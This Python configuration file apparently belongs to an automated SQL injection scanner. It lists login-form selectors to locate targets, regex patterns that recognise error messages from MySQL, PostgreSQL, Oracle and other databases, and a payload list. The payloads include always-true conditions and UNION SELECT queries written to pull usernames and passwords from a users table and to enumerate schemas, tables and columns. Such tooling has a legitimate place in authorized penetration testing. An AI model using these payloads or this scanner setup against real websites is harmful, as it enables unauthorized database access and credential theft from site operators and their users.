# config/settings.py

class LoginDetectionSettings:
    LOGN_INPUTS = [
        # ... (previous login inputs)
        'data-cy="password-input"',  # Another custom password input
        'id="user"',  # User ID input
        'id="login-form"',  # Login form identifier
        'data-test="login-btn"',  # Test-specific login button
        'data-qa="login-field"',  # Quality assurance login field
        'data-hook="password-input"',  # Password input hook
        'data-test-id="submit-button"',  # Test-specific submit button
        'id="user-login"',  # User login identifier
        'data-login="true"',  # Data attribute for login
        'name="login-email"',  # Login email input
        'data-test-id="login-form"',  # Test-specific login form
        'data-locator="login"',  # Data locator for login
        'data-selector="login-input"',  # Data selector for login input
        'data-key="login-input"',  # Data key for login input
        'class="login-element"',  # Class-based login element
        'data-input="user"',  # Data input for user
        'data-testid="login-password"',  # Test-specific login password input
        'data-automation-id="login-field"',  # Automation ID for login field
        'data-login="username"',  # Data attribute for username input
    ]


class SQLInjectionSettings:
    PAYLOADS = [
        # ... (previous payloads)
        "' OR 1=1 --",  # Another simple payload
        "' UNION SELECT NULL, user, password FROM users--",  # Retrieve user and password
        "' AND 1=2 --",  # False condition payload
        "' UNION SELECT 1, @@version, null--",  # Retrieve database version
        "' AND 1=1 UNION ALL SELECT NULL, username, password FROM users--",  # Retrieve username and password
        "' UNION SELECT NULL, table_name, column_name FROM information_schema.columns--",  # List tables and columns
        "' OR 'x'='x",  # Always true condition
        "' AND 1=1 UNION SELECT @@version, null, null--",  # Retrieve database version
        "' UNION SELECT 1, current_database(), null--",  # Retrieve current database name
        "' AND 1=1 UNION ALL SELECT table_name, column_name, null FROM information_schema.columns--",  # List tables and columns
        "' UNION SELECT 1, schema_name, null FROM information_schema.schemata--",  # List database schemas
        "' OR 'a'='a",  # Always true condition
        "' AND 1=1 UNION SELECT table_name, null, null FROM information_schema.tables--",  # List tables
        "' UNION SELECT 1, database(), null--",  # Retrieve current database name
        "' AND 1=1 UNION ALL SELECT column_name, null, null FROM information_schema.columns--",  # List column names
        "' UNION SELECT 1, @@version, user--",  # Retrieve version and user
        "' OR 'b'='b",  # Always true condition
        "' AND 1=1 UNION SELECT table_name, column_name, data_type FROM information_schema.columns--",  # List columns with data type
        "' UNION SELECT 1, database(), user--",  # Retrieve database name and user
    ]


class DatabaseErrorSettings:
    ERRORS = {
        "MySQL": (
            r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\.", r"MySQL Query fail.*", r"SQL syntax.*MariaDB server.*", r"SQL ERROR.*"
        ),
        "PostgreSQL": (
            r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\.", r"Warning.*PostgreSQL"
        ),
        "Microsoft SQL Server": (
            r"Invalid object name '[\w_]+'", r"Conversion failed when converting the nvarchar value '[\w_]+' to data type int", r"The multi-part identifier '[\w_]+' could not be bound",
            r"Procedure or function '[\w_]+' expects parameter '[\w_]+' which was not supplied", r"Arithmetic overflow error converting expression to data type int",
            r"The server principal '[\w_]+' is not able to access the database '[\w_]+'", r"Invalid use of side-effecting or time-dependent operator in '[\w_]+' within a function",
            r"The INSERT statement conflicted with the FOREIGN KEY constraint '[\w_]+'", r"The user does not have permission to perform this action",
            r"Cannot insert duplicate key in object '[\w_]+\.([\w_]+)'", r"Violation of ([\w_]+) constraint", r"The filegroup '[\w_]+' cannot be removed because it is not empty",
            r"The target table '([\w_]+)' of the OUTPUT INTO clause cannot have any enabled triggers if the clause contains an OUTPUT clause",
            r"Invalid column name '[\w_]+'", r"The log for database '[\w_]' is not available", r"Database '([\w_]+)' does not exist. Make sure that the name is entered correctly",
            r"Could not find server '[\w_]+', connection cannot be established", r"The operation failed because the database does not exist, or the database is not in a state that allows access checks"
        ),
        "Oracle": (
            r"ORA-[0-9][0-9][0-9][0-9]:", r"ORA-00942: table or view does not exist", r"ORA-00904: '[\w_]+' is not a valid column name",
            r"ORA-01017: invalid username/password; logon denied", r"ORA-01403: no data found", r"ORA-02291: integrity constraint ([\w_]+) violated - parent key not found",
            r"ORA-12170: TNS:Connect timeout occurred", r"ORA-12514: TNS:listener does not currently know of service requested in connect descriptor",
            r"ORA-28000: the account is locked", r"ORA-20000: Unable to create log table ([\w_]+)"
        ),
        "IBM DB2": (
            r"SQLCODE=-[0-9]+,", r"SQLSTATE=([0-9A-Z]+)", r"SQL0575N: ([\w_]+) is not valid in the context where it is used",
            r"SQL0433N: ([\w_]+) does not have the privilege to perform operation ([\w_]+) on object ([\w_]+)",
            r"SQL0668N: Operation not allowed for reason code ([0-9]+)", r"SQL0955C: The table or index cannot be dropped because it is currently in use",
            r"SQL0817N: The index ([\w_]+) is dependent on table ([\w_]+)"
        ),
        "SQLite": (
            r"SQLite/JDBCDriver", r"SQLite.Exception", r"SQLITE_ERROR", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]", r"no such table: ([\w_]+)", r"file is not a database", r"malformed database schema",
            r"unable to open database file", r"database is locked", r"near '([\w_]+)': syntax error", r"no such column: ([\w_]+)",
            r"database disk image is malformed", r"file too large", r"out of memory"
        ),
        "Informix": (
            r"Warning.*ibase_.*", r"com.informix.jdbc", r"Statement ([0-9]+): ([\w_]+) has an illegal null argument",
            r"Database error ([0-9]+): Lock timeout expired", r"Database error ([0-9]+): Deadlock detected", r"Database error ([0-9]+): ([\w_]+) is not a valid column name",
            r"Database error ([0-9]+): Could not obtain write locks on table ([\w_]+)", r"Database error ([0-9]+): Attempt to write a read-only database"
        ),
        "Sybase": (
            r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*", r"Insert value list does not match column list",
            r"Update value list does not match column list", r"Invalid column name '[\w_]+'", r"Cursor not open", r"Column '[\w_]+' not found in any table",
            r"Invalid object name '[\w_]+'", r"Function '[\w_]+' not found", r"Duplicate key row", r"Cannot insert duplicate key row",
            r"Command has been aborted"
        )
    }


# Example of usage:
# logn_inputs = LoginDetectionSettings.LOGN_INPUTS
# payloads = SQLInjectionSettings.PAYLOADS
# errors = DatabaseErrorSettings.ERRORS["MySQL"]
